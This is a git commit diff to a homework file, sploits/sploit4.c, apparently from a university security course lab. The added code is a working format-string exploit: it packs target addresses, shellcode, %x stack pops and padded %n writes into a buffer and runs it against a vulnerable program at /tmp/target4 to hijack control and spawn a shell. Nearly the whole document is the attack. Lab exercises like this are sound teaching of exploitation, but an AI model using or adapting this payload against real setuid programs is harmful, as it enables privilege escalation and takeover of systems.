59ef11ff7c87da9477011b6dcd893b8557bf620f
Shawn Zhong <github@shawnzhong.com>
2020-04-13 23:55:51 -0500

    Update sploit4.c

--- HW4/sploits/sploit4.c
+++ HW4/sploits/sploit4.c
@@ -1,17 +1,45 @@
+#include "shellcode.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include "shellcode.h"
 
 #define TARGET "/tmp/target4"
 
-int main(void)
-{
+int main(void) {
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  char buf[481] = "\x9c\xfc\xff\xbf"
+                  "\x9d\xfc\xff\xbf"
+                  "\x9e\xfc\xff\xbf"
+                  "\x9f\xfc\xff\xbf";
+
+  strcpy(buf + strlen(buf), shellcode);
+
+  strcpy(buf + strlen(buf), "%x%x%x");
+
+  // expected 0xbffffac8
+
+  memset(buf + strlen(buf), 'A', 136);
+  strcpy(buf + strlen(buf), "%n");
+
+  memset(buf + strlen(buf), 'A', 0xfa - 0xc8);
+  strcpy(buf + strlen(buf), "%n");
+
+  memset(buf + strlen(buf), 'A', 0xff - 0xfa);
+  strcpy(buf + strlen(buf), "%n");
+
+  memset(buf + strlen(buf), 'A', 0x1bf - 0xff);
+  strcpy(buf + strlen(buf), "%n");
+
+  memset(buf + strlen(buf), 'A', sizeof(buf) - strlen(buf));
+
+  buf[480] = 0;
+
+  args[0] = TARGET;
+  args[1] = buf;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
